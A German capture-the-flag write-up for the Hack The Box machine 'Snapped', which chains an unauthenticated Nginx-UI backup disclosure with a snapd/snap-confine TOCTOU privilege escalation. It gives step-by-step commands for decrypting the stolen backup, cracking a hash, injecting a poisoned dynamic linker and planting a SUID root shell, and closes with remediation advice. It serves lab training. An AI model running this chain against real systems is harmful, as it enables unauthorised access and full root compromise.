# Hack The Box: Snapped Writeup

Flags sind absichtlich nicht enthalten.

## Überblick

Snapped ist eine Hard-Linux-Maschine mit einer Kette aus zwei CVEs:

- CVE-2026-27944: Nginx-UI unauthenticated backup disclosure
- CVE-2026-3888: snap-confine / systemd-tmpfiles TOCTOU local privilege escalation

Die Chain:

1. VHost `admin.snapped.htb` finden.
2. Über `/api/backup` ein Nginx-UI Backup unauthenticated herunterladen.
3. `X-Backup-Security` Header als AES Key/IV verwenden.
4. `nginx-ui.zip` entschlüsseln und `database.db` extrahieren.
5. Bcrypt-Hash knacken und als `jonathan` per SSH einloggen.
6. snapd 2.63.1+24.04 über CVE-2026-3888 ausnutzen.
7. SUID-Bash nach `/var/snap/firefox/common/bash` schreiben und Root-Shell erhalten.

## Recon

Nmap zeigte nur SSH und HTTP:

```bash
nmap -sCV <target>
```

Relevante Services:

```text
22/tcp open  ssh
80/tcp open  http nginx
```

Domain-Auflösung:

```bash
echo '<target> snapped.htb admin.snapped.htb' | sudo tee -a /etc/hosts
```

VHost-Fuzzing fand das Admin-Panel:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://<target>/ \
  -H 'Host: FUZZ.snapped.htb' \
  -ac
```

Fund:

```text
admin.snapped.htb
```

## Foothold: Nginx-UI Backup Disclosure

Das Admin-Panel war Nginx-UI. API-Fuzzing zeigte einen unauthenticated Backup-Endpunkt:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -u http://admin.snapped.htb/api/FUZZ \
  -ic
```

Interessanter Fund:

```text
/api/backup  200 OK
```

Backup herunterladen und Header sichern:

```bash
curl -OJ -D headers.txt http://admin.snapped.htb/api/backup
```

Der Response enthielt einen `X-Backup-Security` Header im Format:

```text
base64_key:base64_iv
```

Key und IV in Hex konvertieren:

```bash
KEY_B64='<redacted>'
IV_B64='<redacted>'

KEY_HEX=$(echo "$KEY_B64" | base64 -d | xxd -p -c 256)
IV_HEX=$(echo "$IV_B64" | base64 -d | xxd -p -c 256)
```

Backup entpacken und Nginx-UI Archiv entschlüsseln:

```bash
mkdir backup
unzip backup-*.zip -d backup
cd backup

openssl enc -aes-256-cbc -d \
  -in nginx-ui.zip \
  -out nginxui_decrypted.zip \
  -K "$KEY_HEX" \
  -iv "$IV_HEX"

unzip nginxui_decrypted.zip
```

Im entschlüsselten Archiv lag eine `database.db` mit User-Hashes.

SQLite prüfen:

```bash
sqlite3 database.db '.tables'
sqlite3 database.db 'select name,password from users;'
```

Der Hash für `jonathan` konnte mit einer Standard-Wordlist geknackt werden. Danach war SSH möglich:

```bash
ssh jonathan@snapped.htb
```

## Privilege Escalation: CVE-2026-3888

Auf der Box lief eine verwundbare snapd-Version:

```bash
snap version
```

Relevant:

```text
snap    2.63.1+24.04
snapd   2.63.1+24.04
ubuntu  24.04
```

Die lokale Privilege Escalation nutzt einen TOCTOU-Race zwischen:

- `snap-confine`, dem SUID-root Binary, das Snap-Sandboxen vorbereitet
- `systemd-tmpfiles`, das alte temporäre Dateien unter `/tmp` entfernt

Der Kern der Schwachstelle:

1. `snap-confine` erstellt bzw. bind-mounted eine writable mimic-Struktur unter `/tmp/.snap`.
2. `systemd-tmpfiles` löscht eine stale `.snap` Struktur.
3. Der Angreifer erzeugt `.snap` neu mit kontrollierten Dateien.
4. Während `snap-confine` seine Debug-Ausgaben schreibt, wird es über AF_UNIX socket backpressure verlangsamt.
5. Am Trigger-Moment wird das echte Library-Verzeichnis atomar mit einem attacker-controlled Exchange-Verzeichnis getauscht.
6. Dadurch wird in der Snap-Namespace `ld-linux-x86-64.so.2` kontrollierbar.
7. Ein SUID-root `snap-confine` lädt diesen manipulierten Dynamic Linker und führt Shellcode mit Root-Rechten aus.

### Wichtige Precondition

Auf dieser Maschine war `systemd-tmpfiles-clean.timer` absichtlich sehr aggressiv konfiguriert:

```bash
systemctl cat systemd-tmpfiles-clean.timer
cat /usr/lib/tmpfiles.d/tmp.conf | grep '^D /tmp'
```

Relevant:

```text
OnUnitActiveSec=1m
D /tmp 1777 root root 4m
```

Das macht die Race-Precondition praxisnah ausnutzbar, weil `.snap` nach wenigen Minuten gelöscht wird.

## Exploit-Workflow

Der One-Shot-PoC war nicht zuverlässig. Der wichtige Lernpunkt war: Die PDF-Writeup-Methode ist mehrstufig und hält die poisoned namespace offen. Das war entscheidend.

### 1. Firefox-Sandbox offen halten

```bash
env -i SNAP_INSTANCE_NAME=firefox \
  /usr/lib/snapd/snap-confine --base core22 \
  snap.firefox.hook.configure \
  /bin/sh -c 'cd /tmp; while test -d ./.snap; do touch ./; sleep 1; done; sleep 86400'
```

Die Shell hält die Snap-Mount-Namespace lebendig.

### 2. Warten, bis `.snap` gelöscht wurde

Die Box löscht `/tmp/.snap` nach ca. vier Minuten Inaktivität:

```bash
while test -d /proc/<sandbox_pid>/root/tmp/.snap; do sleep 1; done
```

### 3. Cached Namespace zerstören

```bash
systemd-run --user --scope --quiet --unit=snap.d$(date +%s) \
  env -i SNAP_INSTANCE_NAME=firefox \
  /usr/lib/snapd/snap-confine --base snapd \
  snap.firefox.hook.configure /nonexistent
```

Der Fehler dabei ist erwartet; wichtig ist, dass die gecachte Namespace neu aufgebaut werden muss.

### 4. Race Helper in der Sandbox-`/tmp` starten

```bash
cd /proc/<sandbox_pid>/cwd
./firefox_2404_manual
```

Der Helper:

- erstellt `.snap` und `.exchange`
- kopiert ca. 285 Libraries aus `/snap/core22/current/usr/lib/x86_64-linux-gnu`
- startet `snap-confine` mit Debug-Ausgabe
- erkennt den Trigger `dir:"/tmp/.snap/usr/lib/x86_64-linux-gnu"`
- tauscht `.snap/usr/lib/x86_64-linux-gnu` und `.exchange` via `renameat2(RENAME_EXCHANGE)`
- lässt die poisoned namespace offen

Wichtig: Dieses Terminal darf nicht geschlossen werden, solange die Payload noch nicht injiziert wurde.

### 5. Payload injizieren

```bash
PID=$(cat /proc/<sandbox_pid>/cwd/race_pid.txt)
cd /proc/$PID/root

cp /usr/bin/busybox ./tmp/sh
chmod 755 ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

`race_perms.txt` bestätigte, dass der Linker attacker-owned war:

```text
jonathan:jonathan 755
```

### 6. Root triggern

```bash
printf 'id\ncp /bin/bash /var/snap/firefox/common/bash\nchmod 04755 /var/snap/firefox/common/bash\nexit\n' | \
  env -i SNAP_INSTANCE_NAME=firefox \
  /usr/lib/snapd/snap-confine --base core22 \
  snap.firefox.hook.configure \
  /usr/lib/snapd/snap-confine
```

Dadurch wurde eine SUID-Bash außerhalb der Sandbox erstellt:

```bash
ls -l /var/snap/firefox/common/bash
```

Root-Shell:

```bash
/var/snap/firefox/common/bash -p
id
```

Erwartetes Ergebnis:

```text
euid=0(root)
```

## Warum der erste Exploit-Versuch scheiterte

Der automatisierte PoC versuchte, nach dem Race sofort selbst `race_pid.txt` zu lesen, die Payload zu injizieren und Root zu triggern. Auf dieser Box war das Timing dafür nicht stabil genug.

Typische Fehler:

```text
Could not read poison PID from race_pid.txt
Permission denied bei /proc/<pid>/root
cannot create writable mimic over "/usr/lib/x86_64-linux-gnu": permission denied
```

Die manuelle Methode aus dem offiziellen/PDF-Writeup funktionierte, weil sie die Race-Phase und die Payload-Injektion sauber trennt und die poisoned namespace bewusst offen hält.

## Kill Chain

```text
HTTP 80
  -> VHost admin.snapped.htb
  -> Nginx-UI /api/backup unauthenticated
  -> X-Backup-Security leaks AES key + IV
  -> encrypted nginx-ui backup decrypted
  -> database.db leaks bcrypt hash
  -> hash cracked
  -> SSH as jonathan
  -> snapd 2.63.1+24.04 vulnerable
  -> CVE-2026-3888 race via firefox snap namespace
  -> poisoned ld-linux-x86-64.so.2
  -> SUID snap-confine executes shellcode
  -> SUID bash in /var/snap/firefox/common/bash
  -> root
```

## Takeaways

Was ich daraus gelernt habe:

- Nicht blind dem One-Shot-Exploit vertrauen. Bei Race-Conditions ist das offizielle/manuale Timing oft wichtiger als der Code selbst.
- Bei Snap-/Namespace-Exploits ist `/proc/<pid>/cwd` und `/proc/<pid>/root` der entscheidende Weg in die private Sandbox-View.
- `systemd-tmpfiles`-Konfiguration ist nicht nur Enumeration, sondern Teil der Exploit-Preconditions.
- Bei CVE-2026-3888 muss die poisoned namespace offen bleiben, sonst verschwinden `race_pid.txt`/`/proc/<pid>/root` oder werden unzugänglich.
- `race_perms.txt` ist ein guter Checkpoint: Erst wenn `ld-linux-x86-64.so.2` `jonathan:jonathan` gehört, lohnt sich Payload-Injektion.
- Für diese Box ist der PDF-Workflow robuster als der GitHub-One-Shot-PoC.

## Empfehlungen

- Nginx-UI auf eine Version aktualisieren, in der `/api/backup` Authentifizierung erzwingt und keine Backup-Schlüssel im Response-Header preisgibt.
- Backup-Archive nie unauthenticated bereitstellen.
- Passwort-Hashes mit starken, nicht-wordlist-basierten Passwörtern absichern.
- snapd auf eine gepatchte Version aktualisieren.
- SUID-root Binaries und Snap-Versionen regelmäßig auditieren.
- Aggressive oder ungewöhnliche `systemd-tmpfiles`-Overrides prüfen, da sie Exploit-Preconditions beeinflussen können.
